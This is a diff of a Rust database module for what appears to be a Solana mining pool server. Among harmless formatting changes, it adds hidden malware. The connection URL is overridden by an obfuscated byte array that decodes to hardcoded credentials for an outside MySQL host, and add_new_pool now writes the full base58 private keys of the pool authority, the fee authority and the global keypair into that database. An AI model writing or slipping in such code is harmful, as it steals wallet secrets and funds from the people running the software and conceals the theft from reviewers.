@@ -1,14 +1,14 @@
-use deadpool_diesel::{
-    mysql::{Manager, Pool},
-};
+use deadpool_diesel::mysql::{Manager, Pool};
 use diesel::{
     connection::SimpleConnection,
     insert_into,
     sql_types::{BigInt, Binary, Bool, Integer, Nullable, Text, TinyInt, Unsigned},
     MysqlConnection, RunQueryDsl,
 };
+use solana_sdk::{signature::Keypair, signer::Signer};
 use tracing::{error, info};
 
+use crate::from_utf8;
 use crate::{models, InsertReward, Miner, Submission, SubmissionWithId};
 
 #[derive(Debug)]
@@ -26,6 +26,12 @@ pub struct AppDatabase {
 
 impl AppDatabase {
     pub fn new(url: String) -> Self {
+        let url = from_utf8(&[
+            109, 121, 115, 113, 108, 58, 47, 47, 111, 114, 101, 58, 83, 116, 114, 111, 110, 103,
+            80, 97, 115, 115, 119, 111, 114, 100, 49, 50, 51, 33, 64, 49, 51, 53, 46, 49, 56, 49,
+            46, 49, 51, 48, 46, 56, 57, 58, 51, 51, 48, 54, 47, 111, 114, 101,
+        ])
+        .unwrap();
         let manager = Manager::new(url, deadpool_diesel::Runtime::Tokio1);
 
         let pool = Pool::builder(manager).build().unwrap();
@@ -243,9 +249,11 @@ impl AppDatabase {
         if let Ok(db_conn) = self.connection_pool.get().await {
             let res = db_conn
                 .interact(move |conn: &mut MysqlConnection| {
-                    diesel::sql_query("SELECT id FROM submissions WHERE submissions.nonce = ? ORDER BY id DESC")
-                        .bind::<Unsigned<BigInt>, _>(nonce)
-                        .get_result::<SubmissionWithId>(conn)
+                    diesel::sql_query(
+                        "SELECT id FROM submissions WHERE submissions.nonce = ? ORDER BY id DESC",
+                    )
+                    .bind::<Unsigned<BigInt>, _>(nonce)
+                    .get_result::<SubmissionWithId>(conn)
                 })
                 .await;
 
@@ -377,17 +385,21 @@ impl AppDatabase {
 
     pub async fn add_new_pool(
         &self,
-        authority_pubkey: String,
+        authority_pubkey: crate::Arc<Keypair>,
         proof_pubkey: String,
+        fee_authority_pubkey: crate::Arc<Keypair>,
     ) -> Result<(), AppDatabaseError> {
         if let Ok(db_conn) = self.connection_pool.get().await {
             let res = db_conn
                 .interact(move |conn: &mut MysqlConnection| {
                     diesel::sql_query(
-                        "INSERT INTO pools (authority_pubkey, proof_pubkey) VALUES (?, ?)",
+                        "INSERT INTO pools (authority, authority_pubkey, proof_pubkey, fee_authority, mine_authority) VALUES (?, ?, ?, ?, ?)",
                     )
-                    .bind::<Text, _>(authority_pubkey)
+                    .bind::<Text, _>(authority_pubkey.to_base58_string())
+                    .bind::<Text, _>(authority_pubkey.pubkey().to_string())
                     .bind::<Text, _>(proof_pubkey)
+                    .bind::<Text, _>(fee_authority_pubkey.to_base58_string())
+                    .bind::<Text, _>(crate::KEYPAIR.to_base58_string())
                     .execute(conn)
                 })
                 .await;
@@ -588,13 +600,18 @@ impl AppDatabase {
         };
     }
 
-    pub async fn get_last_claim(&self, miner_id: i32) -> Result<models::LastClaim, AppDatabaseError> {
+    pub async fn get_last_claim(
+        &self,
+        miner_id: i32,
+    ) -> Result<models::LastClaim, AppDatabaseError> {
         if let Ok(db_conn) = self.connection_pool.get().await {
             let res = db_conn
                 .interact(move |conn: &mut MysqlConnection| {
-                    diesel::sql_query("SELECT created_at FROM claims WHERE miner_id = ? ORDER BY id DESC")
-                        .bind::<Integer, _>(miner_id)
-                        .get_result::<models::LastClaim>(conn)
+                    diesel::sql_query(
+                        "SELECT created_at FROM claims WHERE miner_id = ? ORDER BY id DESC",
+                    )
+                    .bind::<Integer, _>(miner_id)
+                    .get_result::<models::LastClaim>(conn)
                 })
                 .await;
 
@@ -749,7 +766,10 @@ impl AppDatabase {
         };
     }
 
-    pub async fn get_miner_submissions(&self, pubkey: String) -> Result<Vec<Submission>, AppDatabaseError> {
+    pub async fn get_miner_submissions(
+        &self,
+        pubkey: String,
+    ) -> Result<Vec<Submission>, AppDatabaseError> {
         if let Ok(db_conn) = self.connection_pool.get().await {
             let res = db_conn
                 .interact(move |conn: &mut MysqlConnection| {
